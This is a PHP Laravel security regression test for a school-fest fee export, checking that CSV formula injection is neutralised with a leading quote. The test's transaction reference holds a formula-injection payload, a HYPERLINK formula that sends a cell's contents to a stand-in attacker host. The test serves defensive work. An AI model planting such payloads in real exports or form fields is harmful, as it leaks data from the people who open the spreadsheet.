<?php

namespace Tests\Feature\Events;

use App\Models\FeeReceipt;
use App\Models\FestEvent;
use App\Models\FestSchoolEventFee;
use App\Models\SahodayaProfile;
use App\Models\Tenant;
use App\Models\User;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use Tests\TestCase;

/**
 * Security regression test for CWE-1236 (CSV formula injection) in
 * FestEventFeesController::exportPayments. Originally a scratch audit that proved the
 * vulnerability (a raw =HYPERLINK(...) transaction_ref round-tripped unescaped into the
 * exported CSV); now that FestEventFeesController::exportPayments writes through
 * App\Support\CsvSafety::fputcsv(), this asserts the payload is neutralized instead —
 * prefixed with a leading quote so Excel/Sheets treat it as inert text, not a live
 * formula, while the raw payload text still shows up in the export for reconciliation.
 */
class FestEventFeesExportFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    public function test_transaction_ref_formula_payload_is_neutralized_in_csv_export(): void
    {
        $this->seed(RolesAndPermissionsSeeder::class);

        $sahodaya = Tenant::create([
            'id' => (string) Str::uuid(),
            'type' => 'sahodaya',
            'name' => 'Formula Injection Audit Sahodaya',
            'domain' => 'formula-injection-audit.test',
            'is_active' => true,
        ]);
        SahodayaProfile::create([
            'tenant_id' => $sahodaya->id,
            'prefix' => 'FI',
            'student_data_mode' => 'counts_only',
        ]);
        $school = Tenant::create([
            'id' => (string) Str::uuid(),
            'type' => 'school',
            'name' => 'Formula Injection Audit School',
            'parent_id' => $sahodaya->id,
            'membership_status' => 'approved',
            'is_active' => true,
        ]);
        $admin = User::factory()->create(['tenant_id' => $sahodaya->id, 'email_verified_at' => now()]);
        $admin->assignRole('sahodaya_admin');

        $event = FestEvent::create([
            'tenant_id' => $sahodaya->id,
            'title' => 'Formula Injection Audit Event',
            'event_type' => 'kalolsavam',
            'level_round' => 'sahodaya',
            'status' => 'published',
        ]);

        // The realistic attacker: a school-admin typing a "bank transaction reference"
        // into a plain <input>, validated only as 'required|string|max:100' (see
        // app/Http/Controllers/SchoolAdmin/FestRegistrationController.php:1093). No
        // character restriction — a formula/DDE payload passes validation untouched.
        $payload = '=HYPERLINK("https://evil.example/exfil?x="&A1,"Click for receipt")';

        $receipt = FeeReceipt::create([
            'feeable_type' => FestSchoolEventFee::class,
            'feeable_id' => 0,
            'file_path' => 'fest/receipts/dummy.jpg',
            'transaction_ref' => $payload,
            'amount' => 100,
            'status' => 'approved',
        ]);

        FestSchoolEventFee::create([
            'event_id' => $event->id,
            'school_id' => $school->id,
            'participation_item_count' => 1,
            'total_due' => 100,
            'fee_receipt_id' => $receipt->id,
            'status' => 'approved',
        ]);

        $response = $this->actingAs($admin)->get(route('sahodaya.events.fees.export', [
            'tenantId' => $sahodaya->id,
            'event' => $event->id,
        ]));

        $response->assertOk();

        $csv = $response->streamedContent();

        // fputcsv() doubles internal quote characters as ordinary CSV escaping (unrelated
        // to formula-injection safety), so a raw substring match against $payload would be
        // wrong either way — parse the actual data row instead of guessing at the escaped
        // bytes.
        $lines = array_values(array_filter(explode("\n", trim($csv))));
        $dataRow = str_getcsv($lines[1]);
        $transactionRef = $dataRow[9] ?? null;

        $this->assertNotSame($payload, $transactionRef, 'Transaction ref should no longer round-trip as the raw, unneutralized formula payload.');

        // A leading single quote is Excel/Sheets' force-text marker — it neutralizes formula
        // interpretation without altering how the cell displays, so the visible payload
        // text is still present (and usable for reconciliation) right behind it.
        $this->assertSame("'".$payload, $transactionRef);
    }
}
